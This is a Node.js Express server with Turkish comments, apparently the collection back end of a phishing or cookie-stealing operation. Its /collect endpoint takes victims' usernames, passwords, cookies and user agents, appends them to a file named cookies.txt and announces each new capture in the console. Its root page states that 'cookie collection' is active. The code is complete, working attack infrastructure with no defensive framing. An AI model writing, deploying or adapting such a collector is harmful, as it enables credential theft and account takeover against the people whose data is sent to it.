const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Toplanan verileri log dosyasına yaz
app.post('/collect', (req, res) => {
    const data = req.body;
    const log = `\n[${new Date().toISOString()}] User: ${data.username || 'yok'} | Pass: ${data.password || 'yok'} | Cookies: ${data.cookies || 'yok'} | UA: ${data.userAgent || 'yok'}\n---\n`;
    
    fs.appendFile('cookies.txt', log, (err) => {
        if (err) console.error('Yazma hatası:', err);
    });

    console.log('🔥 YENİ ÇEREZ / ŞİFRE GELDİ:', data);
    res.send('OK');
});

// Ana sayfa (test için)
app.get('/', (req, res) => {
    res.send('Zeta sunucusu çalışıyor - Cookie toplama aktif 🛸');
});

app.listen(3000, () => {
    console.log('🚀 Sunucu 3000 portunda dinliyor');
});
